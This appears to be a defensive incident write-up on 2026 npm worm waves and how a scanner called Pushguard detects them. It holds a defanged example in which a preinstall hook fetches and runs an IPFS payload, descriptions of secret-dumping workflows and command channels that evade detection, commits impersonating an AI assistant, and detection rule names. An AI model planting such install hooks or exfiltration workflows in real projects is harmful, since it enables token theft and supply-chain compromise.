# 2026 worm waves: Bitwarden CLI, SAP, @antv, AsyncAPI

**Type:** Package & maintainer takeover · **When:** April to July 2026 · **Status:** confirmed

## What happened
Several npm worm waves followed [Shai-Hulud](shai-hulud-2.md). Each stole tokens, published bad versions and touched the victims' GitHub repos. All facts are from Unit 42 (fetched).
- **@bitwarden/cli@2026.4.0 (22 Apr):** preinstall downloaded Bun and a credential stealer. It injected a `format-check.yml` workflow to dump secrets. It used GitHub commit search as a fallback "dead drop" for commands. Live about 1.5 h.
- **SAP wave (29 Apr):** `@cap-js/*` and `mbt`. Preinstall `node setup.mjs`. Commits were pushed to victim repos under an identity pretending to be Claude. Linked to a too-broad OIDC trust setting.
- **@antv wave (19 May):** the `atool` account published 639 versions across 323 packages in about 1 hour. Preinstall ran bundled Bun. An optional git dependency pointed at an orphan commit in antvis/G2. Version numbers jumped past real releases.
- **AsyncAPI (14 Jul):** direct pushes to unprotected `next` and `schema` release branches started release workflows. They stole `NPM_TOKEN` and `GITHUB_TOKEN`. Stage 2 came from IPFS. Commands came via an Ethereum contract, Nostr and BitTorrent DHT. Spreading was capped at four hops with a 5% canary rollout.

## How it got in
1. A stolen token or a weak CI setting gives publish or push rights.
2. A preinstall script runs on every install.
3. The worm steals more tokens and repeats.

## Why it was hard to spot
- Commands hide in public services (commit search, blockchain, IPFS), so domain blocklists see nothing odd.
- Commits looked like they came from an AI assistant.
- AsyncAPI throttled itself to stay quiet.

## Signs to look for
- In one change: a preinstall that downloads a runtime; a new workflow dumping secrets; a git or orphan-commit dependency; code reading from blockchain RPC, IPFS or Nostr; a direct push to a release branch.
- Across changes over time: hundreds of versions from one account in an hour; versions jumping past real ones; commits by a bot or AI identity that never pushed before.

## Defanged example
```
package.json: "preinstall": "node setup.mjs"
setup.mjs:    cfg = read(<blockchain-contract>); run(fetch("ipfs://<cid>"))
push to refs/heads/next  (no PR)  -> release workflow runs
author: "<ai-assistant-name>" <noreply@<ai-vendor>>
```

## How Pushguard catches it
- **Diff rules:** `js-install-hook-added`, `js-dependency-from-url`, `ci-workflow-changed`, `ci-secret-exfiltration`.
- **Identity & review context:** `unreviewed-push-to-main` (for protected-branch globs you set), `first-push-by-account`, `impersonated-commit`, `author_mismatch`.
- Bursts across many packages or repos are not correlated yet. OIDC trust settings are not checked.

## References
- [Unit 42 (fetched)](https://unit42.paloaltonetworks.com/monitoring-npm-supply-chain-attacks/)
